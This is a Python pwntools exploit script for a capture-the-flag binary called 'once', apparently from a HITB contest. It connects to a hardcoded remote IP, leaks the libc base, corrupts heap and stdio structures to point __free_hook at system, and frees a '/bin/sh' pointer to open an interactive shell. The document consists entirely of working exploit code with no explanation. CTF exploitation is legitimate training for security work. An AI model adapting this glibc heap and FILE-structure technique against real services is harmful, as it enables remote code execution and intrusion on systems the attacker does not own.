from pwn import *
import time

#p = process(["./once"], env={"LD_PRELOAD":"./libc-2.23.so"})
p = remote("47.75.189.102", "9999")
context.binary = "./once"
binary = ELF("./once")
context.log_level = "debug"

p.sendlineafter("> ", "a")
p.recvuntil("Invalid choice\n")
libc_base = int(p.recvuntil(">")[:-1], 0) - 0x6f690
system = libc_base + 0x45390
_IO_2_1_stdout_ = libc_base + 0x3c5620
_IO_2_1_stdin_ = libc_base + 0x3c48e0
buf_base = _IO_2_1_stdin_ + 56
jump = _IO_2_1_stdout_ + 216
free_hook = libc_base + 0x3c67a8
binsh = libc_base + 0x18cd17
log.info("libc_base : " + hex(libc_base))
log.info("_IO_2_1_stdout_: " + hex(_IO_2_1_stdout_))
p.sendline("1")     # 0

vuln_fd = 0x202020
ptr = 0x202068

# allocate fastbin chunk
time.sleep(0.1)
p.sendlineafter("> ", "2")
time.sleep(0.1)
p.send("A" * 0x18 + "\x58")
time.sleep(0.1)
p.sendlineafter("> ", "3")
time.sleep(0.1)
p.sendlineafter("> ", "4")
time.sleep(0.1)
p.sendlineafter("> ", "1")
time.sleep(0.1)
p.sendlineafter("input size:", str(0x80))
time.sleep(0.1)
p.sendlineafter("> ", "4")
time.sleep(0.1)
p.sendlineafter("> ", "2")
time.sleep(0.1)
p.send("A" * 0x18 + p64(free_hook) + p64(_IO_2_1_stdout_) * 2 + p64(_IO_2_1_stdin_) * 2 + p64(0) + p64(binsh) + p64(0x0000008000000000) + p64(0) * 2)
time.sleep(0.1)
p.sendlineafter("> ", "2")      # quit
time.sleep(0.1)
p.sendlineafter("> ", "2")
time.sleep(0.1)
p.send(p64(system))
time.sleep(0.1)
p.sendlineafter("> ", "4")
time.sleep(0.1)
p.sendlineafter("> ", "3")      # free -> get shell

p.interactive()

# HITB{this_is_the_xxxxxxx_flag}
